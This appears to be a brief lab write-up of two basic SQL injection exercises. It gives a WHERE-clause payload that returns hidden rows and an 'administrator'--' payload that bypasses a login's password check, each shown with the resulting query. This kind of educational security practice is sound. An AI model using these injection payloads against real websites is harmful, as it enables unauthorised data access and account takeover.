# Basic Injection Attacks

## SQLi using WHERE
>This was was rather simple as it just invovled injecting a conditional into the query. 
>
>Don't forget to substitute spaces with '+' when making requests.
>
>Solution: `'+OR+1=1--`
>
>Final query: 
>``` SQL
>SELECT * FROM table WHERE category = ''+OR+1=1--'AND released = 1
>```
>
<br/>

## SQLi basic application login subversion
>This was was also really easy as you could just comment out the logic related to password checking.
>
>Solution: `administrator'--`
>Final query: 
>```SQL
>                                       |    payload   |
>SELECT name FROM users WHERE username='administrator'--'AND [password checking logic here]
>```
>
<br/>